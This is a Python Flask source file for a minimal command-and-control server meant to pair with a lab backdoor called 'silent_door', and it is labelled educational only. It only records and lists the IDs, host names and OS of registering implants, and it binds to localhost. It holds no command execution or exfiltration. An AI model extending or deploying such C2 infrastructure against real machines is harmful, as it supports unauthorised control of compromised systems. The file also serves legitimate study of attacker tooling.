"""
C2 (Command and Control) Server - PoC / Educational purposes only.

This server is intended for lab/study use with the silent_door backdoor.
Critical or production-ready features are intentionally omitted.
"""

import re
from datetime import datetime, timezone

from flask import Flask, request, jsonify

app = Flask(__name__)

# In-memory store for connected modes (not persistent)
modes = {}


@app.route("/", methods=["GET"])
def index():
    return jsonify({"status": "ok", "message": "C2 server running (PoC/Educational only)"}), 200


_mode_ID_RE = re.compile(r"^[A-Za-z0-9_\-]{1,64}$")


@app.route("/register", methods=["POST"])
def register():
    """Endpoint for a backdoor mode to register its presence."""
    if not request.is_json:
        return jsonify({"error": "Content-Type must be application/json"}), 415

    data = request.get_json(silent=True)
    if data is None:
        return jsonify({"error": "invalid JSON body"}), 400

    mode_id = data.get("id", "")
    if not mode_id or not _mode_ID_RE.match(mode_id):
        return jsonify({"error": "missing or invalid mode id (alphanumeric, 1-64 chars)"}), 400

    modes[mode_id] = {
        "id": mode_id,
        "host": str(data.get("host", "unknown"))[:128],
        "os": str(data.get("os", "unknown"))[:64],
        "last_seen": datetime.now(timezone.utc).isoformat(),
    }
    return jsonify({"status": "registered", "mode_id": mode_id}), 200


@app.route("/modes", methods=["GET"])
def list_modes():
    """Return the list of registered modes."""
    return jsonify({"modes": list(modes.values())}), 200

@app.route("/modes/<mode_id>", methods=["GET"])
def get_mode(mode_id):
    """Return details for a specific mode."""
    mode = modes.get(mode_id)
    if not mode:
        return jsonify({"error": "mode not found"}), 404
    return jsonify({"mode": mode}), 200   

if __name__ == "__main__":
    # Debug mode disabled; bind only to localhost for safety in a lab environment
    app.run(host="127.0.0.1", port=5000, debug=False)
